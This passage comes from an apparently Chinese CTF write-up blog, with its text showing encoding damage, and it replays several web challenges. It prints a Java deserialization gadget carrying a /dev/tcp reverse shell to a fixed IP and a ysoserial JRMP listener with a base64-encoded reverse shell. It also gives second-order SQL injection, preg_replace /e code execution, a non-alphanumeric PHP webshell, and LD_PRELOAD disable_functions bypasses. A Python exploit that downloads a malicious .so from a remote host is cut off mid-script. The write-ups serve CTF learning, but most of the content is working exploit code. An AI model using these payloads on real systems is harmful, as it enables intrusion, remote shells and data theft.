import javax.servlet.http.HttpServletResponse; import org.apache.commons.fileupload.disk.DiskFileItem; import org.springframework.stereotype.Controller; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.multipart.MultipartFile; import org.springframework.web.multipart.commons.CommonsMultipartFile; @Controller public class PictureController { @RequestMapping({\u0026#34;/showpic.form\u0026#34;}) public String index(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, String file) throws Exception { if (file == null) file = \u0026#34;showpic.jsp\u0026#34;; String[] attribute = file.split(\u0026#34;\\\\.\u0026#34;); String suffix = attribute[attribute.length - 1]; if (!suffix.equals(\u0026#34;jsp\u0026#34;)) { boolean isadmin = ((ClientInfo)httpServletRequest.getSession().getAttribute(\u0026#34;cinfo\u0026#34;)).getName().equals(\u0026#34;admin\u0026#34;); if (!isadmin \u0026amp;\u0026amp; (!suffix.equals(\u0026#34;jpg\u0026#34;) || !suffix.equals(\u0026#34;gif\u0026#34;))) { return \u0026#34;onlypic\u0026#34;; } show(httpServletRequest, httpServletResponse, file); return \u0026#34;showpic\u0026#34;; } StringBuilder stringBuilder = new StringBuilder(); for (int i = 0; i \u0026lt; attribute.length - 1; i++) { stringBuilder.append(attribute[i]); } String jspFile = stringBuilder.toString(); int unixSep = jspFile.lastIndexOf(\u0026#39;/\u0026#39;); int winSep = jspFile.lastIndexOf(\u0026#39;\\\\\u0026#39;); int pos = (winSep \u0026gt; unixSep) ? winSep : unixSep; jspFile = (pos != -1) ? jspFile.substring(pos + 1) : jspFile; if (jspFile.equals(\u0026#34;\u0026#34;)) { jspFile = \u0026#34;showpic\u0026#34;; } return jspFile; } private void show(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, String filename) throws Exception { httpServletResponse.setContentType(\u0026#34;image/jpeg\u0026#34;); InputStream in = httpServletRequest.getServletContext().getResourceAsStream(\u0026#34;/WEB-INF/resource/\u0026#34; + filename); if (in == null) { in = new FileInputStream(filename); } ServletOutputStream servletOutputStream = httpServletResponse.getOutputStream(); byte[] b = new byte[1024]; while (in.read(b) != -1) { servletOutputStream.write(b); } in.close(); servletOutputStream.flush(); servletOutputStream.close(); } @RequestMapping({\u0026#34;/uploadpic.form\u0026#34;}) public String upload(MultipartFile file, HttpServletRequest request, HttpServletResponse response) throws Exception { ClientInfo cinfo = (ClientInfo)request.getSession().getAttribute(\u0026#34;cinfo\u0026#34;); if (!cinfo.getGroup().equals(\u0026#34;webmanager\u0026#34;)) return \u0026#34;notaccess\u0026#34;; if (file == null) { return \u0026#34;uploadpic\u0026#34;; } String originalFilename = ((DiskFileItem)((CommonsMultipartFile)file).getFileItem()).getName(); String realPath = request.getSession().getServletContext().getRealPath(\u0026#34;/WEB-INF/resource/\u0026#34;); String path = realPath + originalFilename; file.transferTo(new File(path)); request.getSession().setAttribute(\u0026#34;newpicfile\u0026#34;, path); return \u0026#34;uploadpic\u0026#34;; } } ä¸»è¦ç”¨äºæ–‡ä»¶çš„è¯»å–å’Œå†™å…¥, ä¼šå»é€šè¿‡cookieæ ¡éªŒèº«ä»½.\nClientInfoFilter.class\npackage WEB-INF.classes.com.filters; import com.tools.ClientInfo; import com.tools.Tools; import java.io.IOException; import java.util.Base64; import javax.servlet.Filter; import javax.servlet.FilterChain; import javax.servlet.FilterConfig; import javax.servlet.ServletException; import javax.servlet.ServletRequest; import javax.servlet.ServletResponse; import javax.servlet.http.Cookie; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; public class ClentInfoFilter implements Filter { public void init(FilterConfig fcg) {} public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException { Cookie[] cookies = ((HttpServletRequest)request).getCookies(); boolean exist = false; Cookie cookie = null; if (cookies != null) { for (Cookie c : cookies) { if (c.getName().equals(\u0026#34;cinfo\u0026#34;)) { exist = true; cookie = c; break; } } } if (exist) { String b64 = cookie.getValue(); Base64.Decoder decoder = Base64.getDecoder(); byte[] bytes = decoder.decode(b64); ClientInfo cinfo = null; if (b64.equals(\u0026#34;\u0026#34;) || bytes == null) { cinfo = new ClientInfo(\u0026#34;Anonymous\u0026#34;, \u0026#34;normal\u0026#34;, ((HttpServletRequest)request).getRequestedSessionId()); Base64.Encoder encoder = Base64.getEncoder(); try { bytes = Tools.create(cinfo); } catch (Exception e) { e.printStackTrace(); } cookie.setValue(encoder.encodeToString(bytes)); } else { try { cinfo = (ClientInfo)Tools.parse(bytes); } catch (Exception e) { e.printStackTrace(); } } ((HttpServletRequest)request).getSession().setAttribute(\u0026#34;cinfo\u0026#34;, cinfo); } else { Base64.Encoder encoder = Base64.getEncoder(); try { ClientInfo cinfo = new ClientInfo(\u0026#34;Anonymous\u0026#34;, \u0026#34;normal\u0026#34;, ((HttpServletRequest)request).getRequestedSessionId()); byte[] bytes = Tools.create(cinfo); cookie = new Cookie(\u0026#34;cinfo\u0026#34;, encoder.encodeToString(bytes)); cookie.setMaxAge(86400); ((HttpServletResponse)response).addCookie(cookie); ((HttpServletRequest)request).getSession().setAttribute(\u0026#34;cinfo\u0026#34;, cinfo); } catch (Exception e) { e.printStackTrace(); } } chain.doFilter(request, response); } public void destroy() {} } æ§åˆ¶cookieä¸­cinfoé¡¹, å¹¶é€šè¿‡cinfoæ¥æ ¡éªŒèº«ä»½, å¦‚æœæ˜¯ç¬¬ä¸€æ¬¡è®¿é—®å°±ä¼šç»™ä½ è®¾ç½®ä¸€ä¸ªcinfo, èº«ä»½æ˜¯Anonymous, ç»„åˆ«æ˜¯normal\nClientInfo.class\npackage WEB-INF.classes.com.tools; import com.tools.ClientInfo; import java.io.Serializable; public class ClientInfo implements Serializable { private static final long serialVersionUID = 1L; private String name; private String group; private String id; public ClientInfo(String name, String group, String id) { this.name = name; this.group = group; this.id = id; } public String getName() { return this.name; } public String getGroup() { return this.group; } public String getId() { return this.id; } } ç”¨äºå­˜å‚¨ç”¨æˆ·ä¿¡æ¯, ä¼šè¢«æ‹¿æ¥åºåˆ—åŒ–å’Œbase64ä¹‹åä½œä¸ºcinfoçš„å†…å®¹.\nTool.class\npackage WEB-INF.classes.com.tools; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Tools implements Serializable { private static final long serialVersionUID = 1L; public static Object parse(byte[] bytes) throws Exception { ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes)); return ois.readObject(); } private String testCall; public static byte[] create(Object obj) throws Exception { ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream outputStream = new ObjectOutputStream(bos); outputStream.writeObject(obj); return bos.toByteArray(); } private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException { Object obj = in.readObject(); (new ProcessBuilder((String[])obj)).start(); } } Serializeableæ¥å£ä¼šå»æŸ¥çœ‹å½“å‰ç±»ä¸­æ˜¯å¦å®šä¹‰writeObject readObjectå¦‚æœæœ‰çš„è¯, åºåˆ—åŒ–å’Œååºåˆ—åŒ–å°±ç”¨è¿™ä¸¤ä¸ªæ–¹æ³•æ¥å®ç°, å¦åˆ™å°±ç”¨Serializeable å†…ç½®çš„æ¥å£å»è¿›è¡Œåºåˆ—åŒ–ååºåˆ—åŒ–çš„æ“ä½œ.\næ€»ç»“èµ·æ¥å¯èƒ½çš„ç‚¹\nè¯»æ–‡ä»¶ ååºåˆ—åŒ– è¯»æ–‡ä»¶é¦–å…ˆè¦adminç™»å½•æ‰è¡Œ, ä»æºç ä¸­å¯ä»¥çŸ¥é“ç”¨æˆ·åç”¨æˆ·ç»„, æ¥ä¸‹æ¥å†™javaæ¥ä¼ªé€ cinfo.\nåˆ›å»ºjavaé¡¹ç›®, æ‹·è´æºç , ç›®å½•ç»“æ„å¦‚ä¸‹(ç”±äºåºåˆ—åŒ–çš„æ—¶å€™ä¼šå¸¦è¿›å‘½åç©ºé—´ä¿¡æ¯, æ‰€ä»¥ä¸€å®šè¦å¯¹çš„ä¸Š)\nMain.java\nimport java.util.Base64; import com.tools.Tools; import com.tools.ClientInfo; public class Main { public static void main(String[] args) { try { ClientInfo cinfo = new ClientInfo(\u0026#34;admin\u0026#34;, \u0026#34;webmanager\u0026#34;, \u0026#34;B18D77761C9C952BEDB6CDAC4205265B\u0026#34;); byte[] bytes = Tools.create(cinfo); Base64.Encoder encoder = Base64.getEncoder(); System.out.println(encoder.encodeToString(bytes)); } catch (Exception e) { e.printStackTrace(); } } } ä¼ªé€ adminç™»å½•åå°è¯•è¯»æ–‡ä»¶, è¿™é‡Œæœ‰ä¸ªç–‘æƒ‘çš„åœ°æ–¹, çœ‹æºç æ–‡ä»¶è¯»å–çš„è·¯å¾„æ˜¯ç›´æ¥å’Œ/WEB-INF/resource/æ‹¼æ¥åœ¨ä¸€èµ·çš„, çœ‹èµµå¸ˆå‚…çš„wpä¸­æ˜¯é /../../etc/passwdå’Œå®ƒæ‹¼æ¥ä¹‹åå¯ä»¥è¯»åˆ°æ–‡ä»¶, è¿™æ ·çš„è¯è·¯å¾„å°±æ˜¯/WEB-INF/resource//../../etc/passwdäº†, ç„¶åæˆ‘å°è¯•ä¸ç”¨/å¼€å¤´å»æ‹¼æ¥æˆ/WEB-INF/resource/../../../../../../etc/passwdä¸ç®¡åŠ å¤šå°‘ä¸ª../éƒ½è¯»ä¸åˆ°å¯¹åº”çš„æ–‡ä»¶, å¾ˆæ˜¯å›°æƒ‘. ç„¶åè¯»/../../flagæ˜¾ç¤ºæ²¡æœ‰æƒé™.\nå†™æ–‡ä»¶çš„åŠŸèƒ½114å‘Šè¯‰æˆ‘å¯ä»¥å¾€../../../../../../../../tmpä¸‹é¢å†™, å…·ä½“å¤šå°‘ä¸ª../æˆ‘å¿˜äº†\u0026hellip;.ä½†æ˜¯æ²¡æœ‰æ–‡ä»¶åŒ…å«çš„åœ°æ–¹.\nè‡³æ­¤æ–‡ä»¶è¯»å–éƒ¨åˆ†èµ°ä¸é€šäº†.\nååºåˆ—åŒ–éƒ¨åˆ†.\nTools.javaä¸­è¿™æ®µä»£ç \nprivate void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException { Object obj = in.readObject(); (new ProcessBuilder((String[])obj)).start(); } å…¶ä¸­çš„ProcessBuilderæ˜¯å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„.\nhttps://blog.csdn.net/wangmx1993328/article/details/80838768\né‚£å¯ä»¥è€ƒè™‘è®©ååºåˆ—åŒ–çš„cinfoå†…å®¹ä¸æ˜¯Clientinfoçš„åºåˆ—åŒ–å†…å®¹è€Œæ˜¯Toolsçš„åºåˆ—åŒ–å†…å®¹.\nå°†Tools.javaä¸­æ·»åŠ \nprivate String testCall[]; public String[] getTestCall() { return testCall; } public void setTestCall(String[] testCall) { this.testCall = testCall; } Main.java\nimport java.util.Base64; import com.tools.Tools; import com.tools.ClientInfo; public class Main { public static void main(String[] args) { try { String[] cmd = {\u0026#34;bash\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;bash -i\u0026gt;\u0026amp; /dev/tcp/174.0.220.248/9999 0\u0026gt;\u0026amp;1\u0026#34;}; Tools tools = new Tools(); tools.setTestCall(cmd); byte[] bytes = Tools.create(tools); Base64.Encoder encoder = Base64.getEncoder(); System.out.println(encoder.encodeToString(bytes)); } catch (Exception e) { e.printStackTrace(); } } } åå¼¹shell\næœ€åä¸€æ­¥è¿˜æ˜¯æœ‰äº›ä¸æ˜ç™½çš„åœ°æ–¹, å›å¤´æ¥çœ‹.\n2019 ç©ºæŒ‡é’ˆctf å…¬å¼€èµ› hinté¡µé¢è¦æ±‚æ˜¯adminæ‰èƒ½è®¿é—®, é‚£ä¹ˆæ€è·¯å¤§æ¦‚æ¸…æ¥šäº†, å°±æ˜¯é€šè¿‡csrfè®©adminå»è®¿é—®hintç„¶åæŠŠå“åº”å†…å®¹å‘é€å›æ¥, æ¯”èµ›çš„æ—¶å€™æ²¡çœ‹jsä»£ç å°±åšé¢˜å°±æ˜¯é“æ†¨æ†¨è¡Œä¸º.\nfunction isProd(){ return window.location.host==\u0026#39;treasure.npointer.cn\u0026#39;; } function loadPage() { if (!window.location.hash) { window.location.hash = \u0026#39;#home\u0026#39; } url = window.location.hash.substring(1)+\u0026#39;.html\u0026#39;; //è°ƒè¯•å¤ªéº»çƒ¦äº†ï¼Œæ—¥å¸¸æµ‹è¯•æ”¾å¼€é™åˆ¶ if(isProd()) { url = window.location.origin + \u0026#39;/\u0026#39; + url; } $.get(url, function(result){ $(\u0026#34;#content\u0026#34;).html(result); }); } window.addEventListener(\u0026#39;hashchange\u0026#39;,function(event){ loadPage(); }); loadPage(); ç®€å•ç†è§£ä¸€ä¸‹å°±æ˜¯: å½“é”šç‚¹å˜åŒ–çš„æ—¶å€™, å°±åˆ¤æ–­host, å¦‚æœhostæ˜¯treasure.npointer.cnå°±åŠ è½½treasure.npointer.cnåŠ é”šç‚¹åŠ htmlçš„å€¼, å¦‚æœä¸æ˜¯, é‚£ä¹ˆå°±ç›´æ¥åŠ è½½é”šç‚¹åŠ ä¸Šhtmlçš„å€¼, payload\nhttp://treasure.npointer.cn./index.html#http://39.105.176.37:8000/bot è¿™é‡ŒåŸŸååé¢çš„./ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡è§è¯†, ä»–ç¡®å®èƒ½è®¿é—®åˆ°treasure.npointer.cnä½†æ˜¯hoståä¸å†æ˜¯treasure.npointer.cnäº†, é‚£ä¹ˆå°±å¯ä»¥ç»•è¿‡å¯¹ä¸»æœºåçš„åˆ¤æ–­ç›´æ¥è¯·æ±‚é”šç‚¹åé¢çš„å€¼äº†.\nè¿™é‡Œæœ‰ç‚¹å‘, å…¶å®æ˜¯è‡ªå·±ç¬¬ä¸€æ¬¡æ¥è§¦å¤ªèœäº†.å› ä¸ºåŒæºç­–ç•¥çš„å½±å“, æœåŠ¡ç«¯é‚£è¾¹å¿…é¡»è¦è®¾ç½®Access-Control-Allow-Origin=*å¦åˆ™vpsé‚£è¾¹ä¼šæ‹’ç»è·¨åŸŸè¯·æ±‚\nä½¿ç”¨ä»¥ä¸‹è„šæœ¬åœ¨åŒç›®å½•ä¸‹æ‰§è¡Œå¼€å¯pythonçš„æœåŠ¡å™¨\n#!/usr/bin/env python # -*- coding: utf-8 -*- try: from http.server import HTTPServer, SimpleHTTPRequestHandler, test as test_orig import sys def test (*args): test_orig(*args, port=int(sys.argv[1]) if len(sys.argv) \u0026gt; 1 else 8000) except ImportError: # Python 2 from BaseHTTPServer import HTTPServer, test from SimpleHTTPServer import SimpleHTTPRequestHandler class CORSRequestHandler (SimpleHTTPRequestHandler): def end_headers (self): self.send_header(\u0026#39;Access-Control-Allow-Origin\u0026#39;, \u0026#39;*\u0026#39;) SimpleHTTPRequestHandler.end_headers(self) if __name__ == \u0026#39;__main__\u0026#39;: test(CORSRequestHandler, HTTPServer) ç„¶åå‘é€\nhttp://treasure.npointer.cn./index.html#http://39.105.176.37:8000/bot ncæ¥å—åˆ°äº†æºä»£ç .\n(åˆ†æè¿‡ç¨‹ä»¥åè¡¥ä¸Š)\nhttp://www.jackson-t.ca/runtime-exec-payloads.html\nvpsä¸Šé¢æ‰§è¡Œ\njava -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.JRMPListener 1088 CommonsCollections5 \u0026#39;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8zOS4xMDUuMTc2LjM3Lzk5OTkgMD4mMQo=}|{base64,-d}|{bash,-i}\u0026#39; é€šè¿‡submitå‘é€\n{\u0026#34;@\\u0074ype\u0026#34;:\u0026#34;org.apache.commons.proxy.provider.remoting.RmiProvider\u0026#34;,\u0026#34;host\u0026#34;:\u0026#34;39.105.176.37\u0026#34;,port:\u0026#34;1088\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;Object\u0026#34;} ","permalink":"https://dragonbox.top/posts/sec-java-web/","summary":"\u003cp\u003eå¼€ä¸€ä¸ªæ–°å‘~~\u003c/p\u003e","title":"java_webé¢˜ç›®å¤ç°è®°å½•"},{"content":"è´´å‡ ä¸ªå‚è€ƒé“¾æ¥\nhttps://www.cnblogs.com/wfzWebSecuity/p/11213732.html\nhttps://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD\nbyteCTF babyblog çœ‹é¦–é¡µ\nåŠŸèƒ½ç‚¹\nå†™åšå®¢ ç¼–è¾‘åšå®¢ åˆ é™¤åšå®¢ æŸ¥æ‰¾å­—ç¬¦ä¸²å¹¶æ›¿æ¢ è¿™ä¸ªreplaceæœ‰ç‚¹è¯¡å¼‚, éœ€è¦vipèº«ä»½, çœ‹æºä»£ç å…³é”®çš„ä¸€æ­¥åœ¨edit.phpä¸­\nif(isset($_POST[\u0026#39;title\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;content\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;id\u0026#39;])){ foreach($sql-\u0026gt;query(\u0026#34;select * from article where id=\u0026#34; . intval($_POST[\u0026#39;id\u0026#39;]) . \u0026#34;;\u0026#34;) as $v){ $row = $v; } if($_SESSION[\u0026#39;id\u0026#39;] == $row[\u0026#39;userid\u0026#39;]){ $title = addslashes($_POST[\u0026#39;title\u0026#39;]); $content = addslashes($_POST[\u0026#39;content\u0026#39;]); $sql-\u0026gt;query(\u0026#34;update article set title=\u0026#39;$title\u0026#39;,content=\u0026#39;$content\u0026#39; where title=\u0026#39;\u0026#34; . $row[\u0026#39;title\u0026#39;] . \u0026#34;\u0026#39;;\u0026#34;); exit(\u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;Edited successfully.\u0026#39;);location.href=\u0026#39;index.php\u0026#39;;\u0026lt;/script\u0026gt;\u0026#34;); }else{ exit(\u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;You do not have permission.\u0026#39;);history.go(-1);\u0026lt;/script\u0026gt;\u0026#34;); } } è¿™é‡Œå­˜åœ¨ä¸€å¤„äºŒæ¬¡æ³¨å…¥, å°†åŸæ¥çš„æ–‡ç« é€‰å‡ºæ¥åå°†ä»–çš„titleä¸ç»è¿‡addslashesç›´æ¥æ‹¼æ¥è¿›äº†updateè¯­å¥ä¸­.\nupdate users set isvip=1 where username=\u0026#39;ch3n9w\u0026#39; \u0026#39;;set @a=0x757064617465207573657273207365742069737669703d3120776865726520757365726e616d653d2763683473657227;prepare kk from @a;execute kk;\u0026#39; è¿™æ ·æˆ‘å°±æ˜¯vipäº†, å¯ä»¥ä½¿ç”¨replaceåŠŸèƒ½äº†, è¿™ä¸ªåœ¨æºç ä¸­å…¶å®å°±æ˜¯preg_replace.\n$content = addslashes(preg_replace(\u0026#34;/\u0026#34; . $_POST[\u0026#39;find\u0026#39;] . \u0026#34;/\u0026#34;, $_POST[\u0026#39;replace\u0026#39;], $row[\u0026#39;content\u0026#39;])); ä¼ å…¥å‚æ•°\nfind=/e%00 replace=phpinfo(); å°±æ‰§è¡ŒæˆåŠŸäº†, å†™ä¸€ä¸ªshellè¿›å»å…ˆ. ç„¶åå‘ç°systemç±»å‡½æ•°éƒ½è¢«ç¦ç”¨äº†, è€Œä¸”è¿˜æœ‰basediré™åˆ¶, åœ¨init_setè¢«ç¦æ­¢çš„æƒ…å†µä¸‹, å¯ä»¥ä½¿ç”¨globåè®®\nif ($dh = opendir(\u0026#34;glob:///*\u0026#34;)) {while (($file = readdir($dh)) !== false) {echo \u0026#34;$file\\n\u0026#34;;}closedir($dh);} å‘ç°æ ¹ç›®å½•æœ‰/readflagå’Œ/flag, æ¥ä¸‹æ¥ä½¿ç”¨LD_PRELOADæ¥ç»•è¿‡disable_functionçš„é™åˆ¶, åœ¨disable_functionä¸­çœ‹åˆ°mailå‡½æ•°éƒ½è¢«ç¦ç”¨äº†, è€Œä¸”æ²¡æœ‰å®‰è£…imagemagick , å¯ä»¥è€ƒè™‘ä½¿ç”¨error_logæ¥è§¦å‘, é—®é¢˜æ˜¯è¿™é¢˜ç›®åœ¨buuojç»è¿‡äº†é­”æ”¹, /readflagä¸ä¼šç›´æ¥ç»™å‡ºflagè€Œæ˜¯ç»™å‡ºäº†ä¸€é“è®¡ç®—é¢˜, å›ç­”æ­£ç¡®ä¹‹åæ‰ä¼šç»™å‡ºflag, å¯»æ‰¾ä¸€ä¸ªperlè„šæœ¬æ¥æ‰§è¡Œ, è¿™æ˜¯*ctfçš„ä¸€é“é¢˜ç›®çš„perlè„šæœ¬\nuse strict; use IPC::Open3; my $pid = open3( \\*CHLD_IN, \\*CHLD_OUT, \\*CHLD_ERR, \u0026#39;/readflag\u0026#39; ) or die \u0026#34;open3() failed $!\u0026#34;; my $r; $r = \u0026lt;CHLD_OUT\u0026gt;; print \u0026#34;$r\u0026#34;; $r = \u0026lt;CHLD_OUT\u0026gt;; print \u0026#34;$r\u0026#34;; $r = eval \u0026#34;$r\u0026#34;; print \u0026#34;$r\\n\u0026#34;; print CHLD_IN \u0026#34;$r\\n\u0026#34;; $r = \u0026lt;CHLD_OUT\u0026gt;; print \u0026#34;$r\u0026#34;; $r = \u0026lt;CHLD_OUT\u0026gt;; print \u0026#34;$r\u0026#34;; $r = \u0026lt;CHLD_OUT\u0026gt;; print \u0026#34;$r\u0026#34;; $r = \u0026lt;CHLD_OUT\u0026gt;; print \u0026#34;$r\u0026#34;; å†™å…¥ä¹‹å, ç”±hack.cç¼–è¯‘ä¸€ä¸ªhack.so, hack.cå†…å®¹å¦‚ä¸‹:\n#define _GNU_SOURCE #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;signal.h\u0026gt; void pwn(void) { system(\u0026#34;perl /var/www/html/exp.perl \u0026gt; /var/www/html/res 2\u0026gt;\u0026amp;1\u0026#34;); } void getpid(){ unsetenv(\u0026#34;LD_PRELOAD\u0026#34;); pwn(); } æœ€åæ‰§è¡Œ\nputenv(\u0026#34;LD_PRELOAD=/var/www/html/payload.so\u0026#34;);error_log(\u0026#34;\u0026#34;,1,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;); å°±å¯ä»¥æ‹¿åˆ°flagäº†\næå®¢å¤§æŒ‘æˆ˜ RCEme \u0026lt;?php error_reporting(0); if(isset($_GET[\u0026#39;code\u0026#39;])){ $code=$_GET[\u0026#39;code\u0026#39;]; if(strlen($code)\u0026gt;40){ die(\u0026#34;This is too Long.\u0026#34;); } if(preg_match(\u0026#34;/[A-Za-z0-9]+/\u0026#34;,$code)){ die(\u0026#34;NO.\u0026#34;); } @eval($code); } else{ highlight_file(__FILE__); } // ?\u0026gt; é¦–å…ˆæ˜¯ä¸ªæ— å­—æ¯æ•°å­—shell\nhttp://268a054e-42e7-45d6-a8ba-7f3e67a00d0a.node3.buuoj.cn/?code=$_=\u0026#34;`{{{\u0026#34;^\u0026#34;?\u0026lt;\u0026gt;/\u0026#34;;${$_}[_](${$_}[__]);\u0026amp;_=assert\u0026amp;__=phpinfo() å¾ˆé—æ†¾çš„å‘ç°systemç­‰å‡½æ•°éƒ½ä¸èƒ½æ‰§è¡Œ.\nä¸Šèšå‰‘,ä½†æ˜¯å¾ˆå¥‡æ€ªçš„ä¸èƒ½ç›´æ¥ç”¨å¯†ç __æ¥è¿æ¥, è¦è¿™æ ·è¿, ä¸ç„¶ä¼šæœ‰å¥‡æ€ªçš„ä¸œè¥¿æ˜¾ç¤º\nhttp://268a054e-42e7-45d6-a8ba-7f3e67a00d0a.node3.buuoj.cn/?code=$_=\u0026#34;`{{{\u0026#34;^\u0026#34;?\u0026lt;\u0026gt;/\u0026#34;;${$_}[_](${$_}[__]);\u0026amp;_=assert\u0026amp;__=eval($_POST[a]) \u0026hellip;\u0026hellip;åŸæ¥ä¸€å®šè¦evalä¹ˆ\u0026hellip;..\nç„¶åå‘ç°æ ¹ç›®å½•ä¸‹æœ‰æ— è¯»æƒé™çš„flagå’Œä¸€ä¸ªreadflagäºŒè¿›åˆ¶æ–‡ä»¶.\nè¿ä¸Šä¹‹åå‘/tmpç›®å½•ä¸‹é¢å†™ä¸¤ä¸ªä¸œè¥¿, ä¸€ä¸ªæ˜¯æœ¬åœ°ç”Ÿæˆçš„soæ–‡ä»¶,\nhack.c\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; __attribute__ ((__constructor__)) void angel (void){ unsetenv(\u0026#34;LD_PRELOAD\u0026#34;); system(\u0026#34;/readflag \u0026gt; /tmp/ch3n9w\u0026#34;); } ç¼–è¯‘\ngcc -shared -fPIC hack.c -o hack.so æ‹–ä¸Šå»å°±è¡Œäº†\nch3n9w.php\n\u0026lt;?php putenv(\u0026#34;LD_PRELOAD=/tmp/hack.so\u0026#34;); mail(\u0026#34;\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;\u0026#34;); ?\u0026gt; æœ€ååŒ…å«ä»£ç å»æ‰§è¡Œ\nhttp://268a054e-42e7-45d6-a8ba-7f3e67a00d0a.node3.buuoj.cn/?code=$_=\u0026#34;`{{{\u0026#34;^\u0026#34;?\u0026lt;\u0026gt;/\u0026#34;;${$_}[_](${$_}[__]);\u0026amp;_=assert\u0026amp;__=include(\u0026#34;/tmp/ch3n9w.php\u0026#34;) mailå‡½æ•°äº§ç”Ÿè¿›ç¨‹çš„åŒæ—¶å°±ä¼šè§¦å‘preloadä¸­çš„ä»£ç , ç„¶åè¯»è¾“å‡ºä¸­çš„flagå°±è¡Œäº†\n0ctf Wallbreaker Easy è¿™é“é¢˜ç›®å‚è€ƒäº†å°è¥¿å¸ˆå‚…ã€ä¸€å¶é£˜é›¶å’Œéƒ­dalaoå­¦é•¿çš„åˆ†äº«,çœŸå®åœ°æ„Ÿè§‰è‡ªå·±çš„èœäº†ã€‚ã€‚ã€‚\nåœ¨å†™è„šæœ¬çš„è¿‡ç¨‹ä¸­é‡è§äº†å¾ˆå¤šè¯¡å¼‚çš„é—®é¢˜ï¼Œå…ˆç•™ç€ç¢ç£¨ã€‚\nä¸»è¦æ€è·¯ åˆ©ç”¨Imagick()ä¸­ä¼šè§¦å‘phpè§£é‡Šå™¨å‘å¤–å¼€å¯ç³»ç»Ÿè¿›ç¨‹çš„æ–¹æ³•ï¼Œè¿™é‡Œçš„æ€è·¯æ˜¯å½“ä¼ å…¥MPEGæ ¼å¼ç±»å‹çš„æ–‡ä»¶æ—¶å€™ï¼Œä¸ºäº†è½¬æ¢æ ¼å¼ä¼šå‘å¤–éƒ¨ç¯å¢ƒè¯·æ±‚å¹¶è§¦å‘ffmpegçš„è°ƒç”¨ï¼Œä»è€Œå¼€å¯æ–°çš„è¿›ç¨‹ã€‚åœ¨å¼€å¯æ—¶ï¼Œç¯å¢ƒå˜é‡LD_PRELOADä¼šé¦–å…ˆåŠ è½½ï¼Œè€Œæˆ‘ä»¬äº‹å…ˆä¼šå°†æˆ‘ä»¬çš„æ¶æ„å…±äº«æ–‡ä»¶hack.soåœ¨è¿™ä¸ªç¯å¢ƒå˜é‡ä¸­æŒ‡å‡ºæ¥ï¼Œå³LD_PRELOAD={DIR}/hack.soã€‚hack.soå…±äº«æ–‡ä»¶ç”±hack.cæ–‡ä»¶ç¼–è¯‘ï¼Œå…¶ä¸­è°ƒç”¨äº†__attribute__((constructor))ï¼Œè¯¥æ–¹æ³•ä¼šåœ¨å…±äº«æ–‡ä»¶è¢«åŠ è½½çš„æ—¶å€™ç‡å…ˆè¢«æ‰§è¡Œï¼Œè‡³äºæ‰§è¡Œçš„ä»£ç ï¼Œå½“ç„¶å°±æ˜¯/readflag \u0026gt; {dir}/flagå•¦ã€‚ä¸»è¦ä»£ç å¦‚ä¸‹ï¼Œä»£ç å†™æ³•å€Ÿé‰´äº†éƒ­å¤§ä½¬çš„è„šæœ¬ï¼Œè™½ç„¶æ€è·¯ä¸ä¸€æ ·ï¼Œä¸ªäººæ„Ÿè§‰dalaoçš„æ€è·¯æ›´åŠ ç›´æ¥æ˜äº†ã€‚\nè„šæœ¬\nimport requests import base64 url = \u0026#34;http://111.186.63.208:31340/\u0026#34; dir = \u0026#34;/tmp/ef757c06e983a137384378f47607abfa\u0026#34; #the first time i do this ,i use format function \u0026#39;format\u0026#39; to replace $dir but failed,then i used $dir and \u0026#39;%\u0026#39;,worked ,after the flag went out ,the format problem seems to dispeare? #the new Imagick(\u0026#39;{filename}\u0026#39;) beginning with no work,but didnot after replace\u0026#39;\u0026#39;\u0026#39;to \u0026#39;\u0026#34;\u0026#39;,also disapeared after sovled it cmd = \u0026#39;\u0026#39;\u0026#39; \u0026lt;pre\u0026gt;hello???????\u0026lt;br\u0026gt;\u0026lt;?php echo \u0026#39;hello\u0026#39;;?\u0026gt;\u0026lt;br\u0026gt; \u0026lt;?php $dir = \u0026#34;{0}\u0026#34;; file_put_contents(\u0026#34;{0}/hack.so\u0026#34;,file_get_contents(\u0026#34;http://207.148.64.125:80/hack.so\u0026#34;)); chmod(\u0026#34;{0}/hack.so\u0026#34;,0777); putenv(\u0026#34;LD_PRELOAD={0}/hack.so\u0026#34;); file_put_contents(\u0026#34;{0}/ch3n9w.wmv\u0026#34;,\u0026#34;sssss\u0026#34;); file_put_contents(\u0026#34;{0}/ch3n9w\u0026#34;,\u0026#34;\u0026#34;); $tocken = new Imagick(\u0026#39;{0}/ch3n9w.wmv\u0026#39;); ?\u0026gt; \u0026lt;/pre\u0026gt; \u0026#39;\u0026#39;\u0026#39;.format(dir) #why the command line been executed can not be more than 2 in my script?cause the include will cause error payload = \u0026#39;\u0026#39;\u0026#39; file_put_contents(\u0026#39;%s/evil\u0026#39;,base64_decode(\u0026#34;%s\u0026#34;)); include \u0026#34;%s/evil\u0026#34;; 